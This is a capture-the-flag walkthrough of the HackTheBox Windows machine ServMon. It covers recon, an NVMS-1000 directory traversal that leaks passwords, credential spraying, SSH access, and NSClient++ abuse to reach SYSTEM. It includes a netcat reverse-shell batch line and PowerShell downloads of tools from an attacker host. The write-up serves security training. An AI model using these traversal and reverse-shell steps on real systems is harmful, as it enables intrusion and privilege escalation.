---
title: HTB: ServMon
url: https://0xdf.gitlab.io/2020/06/20/htb-servmon.html
date: 2020-06-20T13:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: htb-servmon, hackthebox, ctf, nmap, windows, ftp, nvms-1000, gobuster, wfuzz, searchsploit, directory-traversal, lfi, ssh, crackmapexec, tunnel, exploit-db, nsclient++, oscp-like-v2, oscp-like-v1, oscp-like-v3
---

![ServMon](https://0xdfimages.gitlab.io/img/servmon-cover.png)

ServMon was an easy Windows box that required two exploits. There’s a hint in the anonymous FTP as to the location of a list of passwords. I can use a directory traversal bug in a NVMS 1000 web instance that will allow me to leak those passwords, and use one of them over SSH to get a shell. Then I can get the local config for the NSClient++ web instance running on TCP 8443, and use those credentials plus another exploit to get a SYSTEM shell.

## Box Info

| Name | [ServMon](https://hackthebox.com/machines/servmon)  [ServMon](https://hackthebox.com/machines/servmon) [Play on HackTheBox](https://hackthebox.com/machines/servmon) |
| --- | --- |
| Release Date | [11 Apr 2020](https://twitter.com/hackthebox_eu/status/1248231031725047809) |
| Retire Date | 20 Jun 2020 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for ServMon |
| Radar Graph | Radar chart for ServMon |
| First Blood User | 00:08:06[sampriti sampriti](https://app.hackthebox.com/users/836) |
| First Blood Root | 00:34:10[sampriti sampriti](https://app.hackthebox.com/users/836) |
| Creator | [dmw0ng dmw0ng](https://app.hackthebox.com/users/82600) |

## Recon

### nmap

`nmap` shows 19 open ports, including a lot of standard Windows stuff, and SSH:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.184
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 15:04 EDT
Warning: 10.10.10.184 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.184
Host is up (0.032s latency).
Not shown: 63129 closed ports, 2387 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
7680/tcp  open  pando-pub
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 39.24 seconds

root@kali# nmap -sV -sC -p 21,22,80,135,139,445,5040,5666,6063,6699,7680,8443 -oA scans/tcpscripts 10.10.10.184
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 15:06 EDT
Nmap scan report for 10.10.10.184
Host is up (0.062s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5040/tcp open  unknown
5666/tcp open  tcpwrapped
6063/tcp open  x11?
6699/tcp open  napster?
7680/tcp open  pando-pub?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|_    host name. Leaving t
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=4/12%Time=5E9366B4%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=4/12%Time=5E9366BB%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0ss\x20not\x20a\x20host\x20name\.\x20Leaving\x20t")%r(HTTPOp
SF:tions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20
SF:not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nContent-Leng
SF:th:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"HTTP/1\.1
SF:\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(SI
SF:POptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\
SF:x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m30s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-12T19:10:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.35 seconds

```

Scanning through the list, my top tier of things to check out will be FTP (TCP 21) with anonymous login allowed, SMB (TCP 445), HTTP (TCP 80) and HTTPS (TCP 8443). LDAP (TCP 389) could be a good place to check as well. WinRM (TCP 5985) and SSH (22) will come in handy if I get creds.

The TLS certificate only gives the name localhost, so no sign of using domain names for different pages.

### FTP - TCP 21

Since `nmap` identified that anonymous FTP was permitted, I’ll grab all of the files there with `wget -r ftp://anonymous:@10.10.10.184`  (this would be not a great idea on a real server where I’d be tons of stuff, but works well for a CTF like HTB). There were two files:

```

root@kali# find ftp/ -type f
ftp/Users/Nadine/Confidential.txt
ftp/Users/Nathan/Notes to do.txt

```

`Confdential.txt` has a note from Nadine to Nathan:

```

Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine

```

`Notes to do.txt` has a to do list:

```

1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint

```

All this information will come in handy later.

### SMB - TCP 445

Without credentials, it appears that I cannot connect to SMB:

```

root@kali# smbmap -H 10.10.10.184
[!] Authentication error on 10.10.10.184
root@kali# smbmap -H 10.10.10.184 -u null
[!] Authentication error on 10.10.10.184

```

### Website - TCP 80

#### Site

The root redirects me to `/Pages/login.htm`, which is a login form for a NVMS-1000:

![image-20200412210043862](https://0xdfimages.gitlab.io/img/image-20200412210043862.png)

Some quick guesses at login didn’t work.

#### Directory Brute Force

`gobuster` reports that there is a 200 return code for even random urls:

```

root@kali# gobuster dir -u http://10.10.10.184 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 40 -o scans/gobuster-80-root-medium       
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.184
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/12 20:43:49 Starting gobuster
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.10.184/0c9929b1-83fe-4af1-acf2-ef06538b5e32 => 200. To force processing of Wildcard respon
ses, specify the '--wildcard' switch 

```

I tested by visiting `/0xdf` (a path that won’t exist), and could see in Burp the response was a 200:

```

HTTP/1.1 200 OK
Content-type: text/xml
Content-Length: 118
Connection: close
AuthInfo: 

<?xml version="1.0" encoding="UTF-8"?>
<response>	<status>fail</status>
	<errorCode>536870934</errorCode>
</response>

```

I tried `wfuzz` where I could filter based on response length. It worked for a couple thousand requests, but then died each time:

```

root@kali# wfuzz -c -u http://10.10.10.184/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hh 118
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.184/FUZZ
Total requests: 207643

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000003:   200        12 L     22 W     340 Ch      "# Copyright 2007 James Fisher"
000000001:   200        12 L     22 W     340 Ch      "# directory-list-lowercase-2.3-medium.txt"
000000002:   200        12 L     22 W     340 Ch      "#"
000000004:   200        12 L     22 W     340 Ch      "#"
000000005:   200        12 L     22 W     340 Ch      "# This work is licensed under the Creative Commons"
000000006:   200        12 L     22 W     340 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"
000000007:   200        12 L     22 W     340 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
000000008:   200        12 L     22 W     340 Ch      "# or send a letter to Creative Commons, 171 Second Street,"
000000009:   200        12 L     22 W     340 Ch      "# Suite 300, San Francisco, California, 94105, USA."
000000010:   200        12 L     22 W     340 Ch      "#"
000000011:   200        12 L     22 W     340 Ch      "# Priority ordered case insensative list, where entries were found"
000000012:   200        12 L     22 W     340 Ch      "# on atleast 2 different hosts"
000000013:   200        12 L     22 W     340 Ch      "#"
000000014:   200        12 L     22 W     340 Ch      ""
000002458:   200        4 L      7 W      118 Ch      "426"
Fatal exception: Pycurl error 7: Failed to connect to 10.10.10.184 port 80: Connection refused

```

#### Vulnerabilities

`searchsploit` shows a directory traversal vulnerability in this application:

```

root@kali# searchsploit "nvms 1000"
---------------------------------------------- ----------------------------------------
 Exploit Title                                |  Path
                                              | (/usr/share/exploitdb/)
---------------------------------------------- ----------------------------------------
NVMS 1000 - Directory Traversal               | exploits/hardware/webapps/47774.txt
---------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

In reading that text file, it basically says I can request `/../../../../../../../../../../../../windows/win.ini` and get it. I’ll kick a request over to Burp Repeater, and it works:

[![](https://0xdfimages.gitlab.io/img/image-20200413101822541.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200413101822541.png)

### Website - TCP 8443

#### Certificate

There’s a TLS server on 8443. Normally with a cert I’d get a hostname and potentially look for vhosts, but this certificate is just for localhost.

#### Site

The site is an instance of NSClient++, an agent designed to do monitoring:

![image-20200412203945417](https://0xdfimages.gitlab.io/img/image-20200412203945417.png)

It seems pretty broken here. Visiting in Cromium (instead of Firefox) does give a log in (some of the time):

![image-20200413100936248](https://0xdfimages.gitlab.io/img/image-20200413100936248.png)

Getting this website to work was quite frustrating. Like I said above, I had much better success in Chromium than I did in Firefox, but even then, it was not stable.

#### Vulnerabilities

There is a known vulnerability in NSClient++ 0.5.2.35:

```

root@kali# searchsploit nsclient
----------------------------------------------- ----------------------------------------
 Exploit Title                                 |  Path
                                               | (/usr/share/exploitdb/)
----------------------------------------------- ----------------------------------------
NSClient++ 0.5.2.35 - Privilege Escalation     | exploits/windows/local/46802.txt
----------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

It’s a local privesc because with a shell on the box, I can get the admin plaintext password from the config files, and then login and create a job to get a shell. I’ll keep this in mind.

## Shell as nadine

### Get Passwords

I first tried to read the NSClient++ config file using the directory traversal vulnerability, but it didn’t work.

I know from the FTP note that there is a file with passwords at `C:\users\nathan\desktop\passwords.txt`. I’ll use the directory traversal vulnerability to try to read that file, and it works:

```

GET /../../../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1

```

Returns:

```

HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$

```

### Check Passwords

Since I only have a list of passwords without usernames, I’ll create a list of what I know now:

```

root@kali# cat users 
administrator
nathan
nadine
root@kali# cat passwords 
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$

```

I can now use `crackmapexec` to see if any of these passwords work for any of the users for smb:

```

root@kali# crackmapexec smb 10.10.10.184 -u users -p passwords
SMB         10.10.10.184    445    SERVMON          [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:SERVMON) (signing:False) (SMBv1:False)
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\administrator:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\administrator:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\administrator:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\administrator:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\administrator:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\administrator:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\administrator:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] SERVMON\nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [+] SERVMON\nadine:L1k3B1gBut7s@W0rk 

```

I’ve got a match, nadine / L1k3B1gBut7s@W0rk.

### SSH

Since SSH is listening on this Windows box, I can use that to get a shell:

```

root@kali# sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184
Microsoft Windows [Version 10.0.18363.752]          
(c) 2019 Microsoft Corporation. All rights reserved.
                                                          
nadine@SERVMON C:\Users\Nadine>

```

I can also grab `user.txt`:

```

nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
67c99afb************************

```

## Priv: nadine –> SYSTEM

### Find NSClient++ Password

With a shell, I can get the NSClient++ password. I could do it by reading the `.ini` file, or just having the helper program tell me:

```

nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT

```

### Setup Tunnel

If I try to log in from `https://10.10.10.184:8443`, it blocks me:

![image-20200413103144194](https://0xdfimages.gitlab.io/img/image-20200413103144194.png)

Towards the top of `nsclient.ini`, there’s this:

```

; Undocumented key                                                                                  
allowed hosts = 127.0.0.1 

```

I need to come from localhost. I’ll re-SSH with a tunnel that runs from my localhost:8443 to localhost on ServMon:8443:

```

root@kali# sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443                                                                                                            [1/1]
Microsoft Windows [Version 10.0.18363.752]          
(c) 2019 Microsoft Corporation. All rights reserved.
                                                          
nadine@SERVMON C:\Users\Nadine>

```

### Exploit

Now I can access `https://127.0.0.1:8443/`, and login with the password:

![image-20200413103430765](https://0xdfimages.gitlab.io/img/image-20200413103430765.png)

To get execution, the [exploit-db](https://www.exploit-db.com/exploits/46802) write-up was not sure helpful, and the web interface was really frustrating. It was very unstable, and made trouble shooting incredibly difficult.

I was able to get success by taking the following steps based on [How To Run Commands](https://docs.nsclient.org/howto/run_commands/) in the NSClient documentation. The steps are for directly interacting with the `nsclient.ini` file, but I eventually got a feel for how to use the web interface to get the same results:
1. Create `shell.bat`:

   ```

   \programdata\nc.exe 10.10.14.24 443 -e cmd

   ```

   This assumes that `nc.exe` is in `C:\programdata` (I will put it there) and it will connect back to me with a shell when run.
2. Upload `nc64.exe` and `shell.bat` to `C:\programdata\`. I started a Python HTTP server on my host, and used PowerShell’s `wget` command:

   ```

   nadine@SERVMON C:\ProgramData>powershell wget http://10.10.14.24/nc64.exe -outfile nc.exe
   nadine@SERVMON C:\ProgramData>powershell wget http://10.10.14.24/shell.bat -outfile shell.bat

   ```
3. In the NSClient++ GUI, first I’ll associate my script with a command by clicking Settings > external scripts > scripts, and then “+Add new”.

   ![image-20200413124942222](https://0xdfimages.gitlab.io/img/image-20200413124942222.png)

</picture>

When I hit “Add”, `df` now shows up under scripts above, and the Changes tab turns red. I can go to Changes and save this to the disk config. This will add the following to the config file:

```

   ; in flight - TODO
   [/settings/external scripts/scripts/df]
   
   ; COMMAND - Command to execute
   command = C:\\programdata\\shell.bat

```
1. Now under scheduler > schedules I’ll hit the “+Add new” button. I need to add two things here. First, I’ll edit the section to add a new name, and then give it an interval of 10 seconds:

   ![image-20200413125324355](https://0xdfimages.gitlab.io/img/image-20200413125324355.png)

</picture>

After hitting Add, I’ll change edit the form, and then Add again:

![image-20200413125404288](https://0xdfimages.gitlab.io/img/image-20200413125404288.png)

Now `df` shows up as a scheduled task, and I can see it has both key/values:

![image-20200620065935852](https://0xdfimages.gitlab.io/img/image-20200620065935852.png)
1. Go to Control –> Reload. Then Wait. It can take longer than it feels like it should. This box can be very frustrating.

Eventually, a shell comes back:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.184.
Ncat: Connection from 10.10.10.184:50376.
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
nt authority\system

```

And I can grab `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
c8290a19************************

```